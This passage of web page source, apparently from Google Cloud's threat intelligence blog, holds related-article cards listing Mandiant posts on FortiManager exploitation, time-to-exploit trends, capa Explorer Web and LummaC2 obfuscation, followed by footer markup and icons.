Fortinet to investigate mass zero-day exploitation of FortiManager appliances.",["https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-400x400.png 324w, https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png 648w"," 324px,  648px","https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png"],null,16,null,"https://cloud.google.com/blog/topics/threat-intelligence/fortimanager-zero-day-exploitation-cve-2024-47575",null,1,[["Mandiant "]],null,"55472"],["Threat Intelligence","How Low Can You Go? An Analysis of 2023 Time-to-Exploit Trends","Mandiant analyzed 138 vulnerabilities that were disclosed in 2023 and that we tracked as exploited in the wild.",["https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-400x400.png 324w, https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png 648w"," 324px,  648px","https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png"],null,10,null,"https://cloud.google.com/blog/topics/threat-intelligence/time-to-exploit-trends-2023",null,1,[["Mandiant "]],null,"55354"],["Threat Intelligence","capa Explorer Web: A Web-Based Tool for Program Capability Analysis","capa Explorer Web is a browser-based tool to display the capabilities found by capa, our reverse engineering tool.",["https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-400x400.png 324w, https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png 648w"," 324px,  648px","https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png"],null,6,null,"https://cloud.google.com/blog/topics/threat-intelligence/capa-explorer-web-program-capability-analysis",null,1,[["Mandiant "]],null,"55327"],["Threat Intelligence","LummaC2: Obfuscation Through Indirect Control Flow","Analysis of malware samples using a technique to thwart all binary analysis tools, and hinder reverse engineering efforts.",["https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-400x400.png 324w, https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png 648w"," 324px,  648px","https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png"],null,23,null,"https://cloud.google.com/blog/topics/threat-intelligence/lummac2-obfuscation-through-indirect-control-flow",null,1,[["Mandiant "]],null,"55290"]],null,"Threat Intelligence",null,[["Threat Intelligence","https://cloud.google.com/blog/topics/threat-intelligence","threat-intelligence"],["Security \u0026 Identity","https://cloud.google.com/blog/products/identity-security","identity-security"]],null,null,42], sideChannel: {}});</script><script id="wiz_jd" nonce="wC8mBVAL5Ft29iPueo1EIg">if (window['_wjdc']) {const wjd = {}; window['_wjdc'](wjd); delete window['_wjdc'];}</script><script aria-hidden="true" id="WIZ-footer" nonce="wC8mBVAL5Ft29iPueo1EIg">window.wiz_progress&&window.wiz_progress(); window.stopScanForCss&&window.stopScanForCss(); ccTick('bl');</script></body></html><footer id="ZCHFDb"><footer class="nRhiJb-RWrDld nRhiJb-yePe5c QJnbF" jscontroller="NsSboe" track-metadata-module="footer"><h3 class="nRhiJb-VqCwd-L6cTce">Footer Links</h3><section class="nRhiJb-haF9Wb r2W5Od"><section class="nRhiJb-DX2B6"><div class="nRhiJb-j5y3u"><h4 class="nRhiJb-BkAck nRhiJb-BkAck-OWXEXe-TzA9Ye">Follow us</h4><ul class="nRhiJb-Qijihe c3Uqdd" role="list"><li class="nRhiJb-KKXgde"><a class="nRhiJb-ARYxNe" href="https://www.x.com/googlecloud" target="_blank" rel="noopener" track-name="x"track-type="social link"track-metadata-position="footer"track-metadata-eventdetail="www.x.com/googlecloud"track-metadata-module="footer"track-metadata-module_headline="follow us"><svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-xgZe3c nRhiJb-Bz112c-OWXEXe-DX2B6" viewBox="0 0 24 24" role="presentation" aria-hidden="true"><path d="M13.9,10.5L21.1,2h-1.7l-6.3,7.4L8,2H2.2l7.6,11.1L2.2,22h1.7l6.7-7.8L16,22h5.8L13.9,10.5L13.9,10.5z M11.5,13.2l-0.8-1.1 L4.6,3.3h2.7l5,7.1l0.8,1.1l6.5,9.2h-2.7L11.5,13.2L11.5,13.2z"></path></svg></a></li><li class="nRhiJb-KKXgde"><a class="nRhiJb-ARYxNe" href="https://www.youtube.com/googlecloud" target="_blank" rel="noopener" track-name="youtube"track-type="social link"track-metadata-position="footer"track-metadata-eventdetail="www.youtube.com/googlecloud"track-metadata-module="footer"track-metadata-module_headline="follow us"><svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-xgZe3c nRhiJb-Bz112c-OWXEXe-DX2B6" viewBox="0 0 24 24" role="presentation" aria-hidden="true"><path d="M23.74 7.1s-.23-1.65-.95-2.37c-.91-.96-1.93-.96-2.4-1.02C17.04 3.47 12 3.5 12 3.5s-5.02-.03-8.37.21c-.46.06-1.48.06-2.39 1.02C.52 5.45.28 7.1.28 7.1S.04 9.05 0 10.98V13c.04 1.94.28 3.87.28 3.87s.24 1.65.96 2.38c.91.95 2.1.92 2.64 1.02 1.88.18 7.91.22 8.12.22 0 0 5.05.01 8.4-.23.46-.06 1.48-.06 2.39-1.02.72-.72.96-2.37.96-2.37s.24-1.94.25-3.87v-2.02c-.02-1.93-.26-3.88-.26-3.88zM9.57 15.5V8.49L16 12.13 9.57 15.5z"></path></svg></a></li><li class="nRhiJb-KKXgde"><a class="nRhiJb-ARYxNe" href="https://www.linkedin.com/showcase/google-cloud" target="_blank" rel="noopener" track-name="linkedin"track-type="social link"track-metadata-position="footer"track-metadata-eventdetail="www.linkedin.com/showcase/google-cloud"track-metadata-module="footer"track-metadata-module_headline="follow us"><svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-xgZe3c nRhiJb-Bz112c-OWXEXe-DX2B6" viewBox="0 0 24 24" role="presentation" aria-hidden="true"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 20c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM8 19H5v-9h3v9zM6.5 8.31c-1 0-1.81-.81-1.81-1.81S5.5 4.69 6.5 4.69s1.81.81 1.81 1.81S7.5 8.31 6.5 8.31zM19 19h-3v-5.3c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5V19h-3v-9h3v1.2c.52-.84 1.59-1.4 2.5-1.4 1.93 0 3.5 1.57 3.5 3.5V19z"></path></svg></a></li><li class="nRhiJb-KKXgde"><a class="nRhiJb-ARYxNe" href="https://www.instagram.com/googlecloud/" target="_blank" rel="noopener" track-name="instagram"track-type="social link"track-metadata-position="footer"track-metadata-eventdetail="www.instagram.com/googlecloud/"track-metadata-module="footer"track-metadata-module_headline="follow us"><svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-xgZe3c nRhiJb-Bz112c-OWXEXe-DX2B6" viewBox="0 0 24 24" role="presentation" aria-hidden="true"><path d="M12,0 C15.3,0 15.7,0 17,0 C18.3,0.1 19.1,0.3 19.9,0.6 C20.7,0.9 21.3,1.3 22,2 C22.7,2.7 23.1,3.4 23.3,4.2 C23.6,5 23.8,5.8 23.9,7.1 C24,8.3 24,8.7 24,12 C24,15.3 24,15.7 23.9,16.9 C23.8,18.2 23.6,19 23.3,19.8 C23,20.6 22.6,21.2 21.9,21.9 C21.3,22.6 20.6,23 19.8,23.3 C19,23.6 18.2,23.8 16.9,23.9 C15.7,24 15.3,24 12,24 C8.7,24 8.3,24 7,24 C5.7,23.9 4.9,23.7 4.1,23.4 C3.3,23.1 2.7,22.7 2,22 C1.3,21.3 0.9,20.6 0.7,19.8 C0.4,19 0.2,18.2 0.1,16.9 C0,15.7 0,15.3 0,12 C0,8.7 0,8.3 0.1,7.1 C0.1,5.8 0.3,4.9 0.6,4.1 C0.9,3.4 1.3,2.7 2,2 C2.7,1.3 3.4,0.9 4.1,0.6 C4.9,0.3 5.8,0.1 7.1,0.1 C8.3,0 8.7,0 12,0 Z M12,2.2 C8.8,2.2 8.4,2.2 7.2,2.2 C6,2.3 5.3,2.5 4.9,2.6 C4.4,2.9 4,3.1 3.5,3.5 C3.1,3.9 2.8,4.3 2.6,4.9 C2.5,5.3 2.3,6 2.3,7.2 C2.2,8.4 2.2,8.8 2.2,12 C2.2,15.2 2.2,15.5 2.3,16.8 C2.3,17.9 2.5,18.6 2.7,19 C2.9,19.6 3.2,20 3.6,20.4 C4,20.8 4.4,21.1 5,21.3 C5.4,21.5 6,21.6 7.2,21.7 C8.4,21.8 8.8,21.8 12,21.8 C15.2,21.8 15.5,21.8 16.8,21.7 C17.9,21.7 18.6,21.5 19,21.3 C19.6,21.1 20,20.8 20.4,20.4 C20.8,20 21.1,19.6 21.3,19 C21.5,18.6 21.6,18 21.7,16.8 C21.8,15.6 21.8,15.2 21.8,12 C21.8,8.8 21.8,8.5 21.7,7.2 C21.7,6.1 21.5,5.4 21.3,5 C21.1,4.4 20.8,4 20.4,3.6 C20,3.2 19.6,2.9 19,2.7 C18.6,2.5 18,2.4 16.8,2.3 C15.6,2.2 15.2,2.2 12,2.2 Z M12,5.8 C15.4,5.8 18.2,8.6 18.2,12 C18.2,15.4 15.4,18.2 12,18.2 C8.6,18.2 5.8,15.4 5.8,12 C5.8,8.6 8.6,5.8 12,5.8 Z M12,16 C14.2,16 16,14.2 16,12 C16,9.8 14.2,8 12,8 C9.8,8 8,9.8 8,12 C8,14.2 9.8,16 12,16 Z M18.4,7 C17.6268014,7 17,6.37319865 17,5.6 C17,4.82680135 17.6268014,4.2 18.4,4.2 C19.1731986,4.2 19.8,4.82680135 19.8,5.6 C19.8,6.37319865 19.1731986,7 18.4,7 Z"></path></svg></a></li><li class="nRhiJb-KKXgde"><a class="nRhiJb-ARYxNe" href="https://www.facebook.com/googlecloud/" target="_blank" rel="noopener" track-name="facebook"track-type="social link"track-metadata-position="footer"track-metadata-eventdetail="www.facebook.com/googlecloud/"track-metadata-module="footer"track-metadata-module_headline="follow us"><svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-xgZe3c nRhiJb-Bz112c-OWXEXe-DX2B6" viewBox="0 0 24 24" role="presentation" aria-hidden="true"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 20c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-1 2v3h-2c-.55 0-1 .45-1 1v2h3v3h-3v7h-3v-7h-2v-3h2V7.5C13 5.57 14.57 4 16.5 4H19z"></path></svg></a></li></ul></div></section></section><section class="nRhiJb-hlZHHf rtKYfe"><div class="nRhiJb-vQnuyc UXgbsb"><a class="ZOs9zc" href="https://cloud.google.com/" title="Google Cloud" track-name="google"track-type="footer link"track-metadata-position="footer"track-metadata-eventdetail="cloud.google.com/"track-metadata-module="footer"><svg class="nRhiJb-vQnuyc-RJLb9c" viewBox="0 0 64 64" role="presentation" aria-hidden="true" width="40" height="40"><path d="M40.37 20.29L42.3333 20.3267L47.67 14.99L47.93 12.73C43.69 8.95667 38.11 6.66 32 6.66C20.9367 6.66 11.6067 14.1833 8.84 24.3833C9.42334 23.98 10.6667 24.28 10.6667 24.28L21.3333 22.5267C21.3333 22.5267 21.8867 21.62 22.1567 21.6767C24.5967 19.0067 28.1067 17.3267 32 17.3267C35.1667 17.3267 38.08 18.44 40.37 20.29Z" fill="#ea4335"/><path d="M55.1667 24.3967C53.93 19.8233 51.37 15.79 47.9267 12.7267L40.3667 20.2867C43.3933 22.7333 45.3333 26.4733 45.3333 30.66V31.9933C49.01 31.9933 52 34.9833 52 38.66C52 42.3367 49.01 45.3267 45.3333 45.3267H32L30.6667 46.6667V54.6667L32 55.9933H45.3333C54.89 55.9933 62.6667 48.2167 62.6667 38.66C62.6667 32.75 59.6933 27.5267 55.1667 24.3967Z" fill="#4285f4"/><path d="M18.6667 55.9933H31.99V45.3267H18.6667C17.6867 45.3267 16.76 45.11 15.92 44.7267L14 45.3167L8.66 50.6567L8.19334 52.46C11.1033 54.6733 14.7333 55.9933 18.6667 55.9933Z" fill="#34a853"/><path d="M18.6667 21.3267C9.11 21.3267 1.33334 29.1033 1.33334 38.66C1.33334 44.2867 4.03 49.2967 8.2 52.4633L15.93 44.7333C13.6167 43.6867 12 41.36 12 38.66C12 34.9833 14.99 31.9933 18.6667 31.9933C21.3667 31.9933 23.6933 33.61 24.74 35.9233L32.47 28.1933C29.3033 24.0233 24.2933 21.3267 18.6667 21.3267Z" fill="#fbbc05"/></svg></a></div><ul class="nRhiJb-hlZHHf-PLDbbf nRhiJb-di8rgd-ZGNLv AXb5J" role="list"><li class="glue-footer__global-links-list-item"><a class="nRhiJb-Fx4vi " href="https://cloud.google.com/" track-name="google cloud"track-type="footer link"track-metadata-position="footer"track-metadata-eventdetail="cloud.google.com/"track-metadata-module="footer">Google Cloud</a></li><li class="glue-footer__global-links-list-item"><a class="nRhiJb-Fx4vi " href="https://cloud.google.com/products/" track-name="google cloud products"track-type="footer link"track-metadata-position="footer"track-metadata-eventdetail="cloud.google.com/products/"track-metadata-module="footer">Google Cloud Products</a></li><li class="glue-footer__global-links-list-item"><a class="nRhiJb-Fx4vi " href="https://myaccount.google.com/privacypolicy?hl=en-US" target="_blank" track-name="privacy"track-type="footer link"track-metadata-position="footer"track-metadata-eventdetail="myaccount.google.com/privacypolicy?hl=en-US"track-metadata-module="footer">Privacy</a></li><li class="glue-footer__global-links-list-item"><a class="nRhiJb-Fx4vi " href="https://myaccount.google.com/termsofservice?hl=en-US" target="_blank" track-name="terms"track-type="footer link"track-metadata-position="footer"track-metadata-eventdetail="myaccount.google.com/termsofservice?hl=en-US"track-metadata-module="footer">Terms</a></li><li aria-hidden="true" class="glue-footer__global-links-list-item"><a aria-hidden="true" role="button" tabindex="0" class="nRhiJb-Fx4vi glue-footer__link glue-cookie-notification-bar-control" href="#" target="_blank" track-name="cookies management controls"track-type="footer link"track-metadata-position="footer"track-metadata-eventdetail="#"track-metadata-module="footer">Cookies management controls</a></li></ul><ul class="nRhiJb-hlZHHf-PLDbbf nRhiJb-hlZHHf-PLDbbf-OWXEXe-hOedQd nRhiJb-di8rgd-ZGNLv qkxr1" role="list"><li class="glue-footer__global-links-list-item nRhiJb-hlZHHf-PLDbbf-rymPhb-ibnC6b-OWXEXe-hOedQd"><a class="nRhiJb-Fx4vi" href="https://support.google.com" target="_blank" track-name="help"track-type="footer link"track-metadata-position="footer"track-metadata-eventdetail="support.google.com"track-metadata-module="footer"><svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-xgZe3c nRhiJb-Bz112c-OWXEXe-yePe5c-h9d3hd" viewBox="0 0 24 24" role="presentation" aria-hidden="true"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"></path></svg>Help</a></li><li class="glue-footer__global-links-list-item nRhiJb-hlZHHf-PLDbbf-rymPhb-ibnC6b-OWXEXe-hOedQd"><select jsaction="change:xU0iy" aria-label="Change language" class="nRhiJb-CL4aqd-j4gsHd"><option value="" selected disabled hidden>Language</option><option value="en" selected>‪English‬</option><option value="de">‪Deutsch‬</option><option value="fr">‪Français‬</option><option value="ko">‪한국어‬</option><option value="ja">‪日本語‬</option></select></li></ul></section></footer></footer>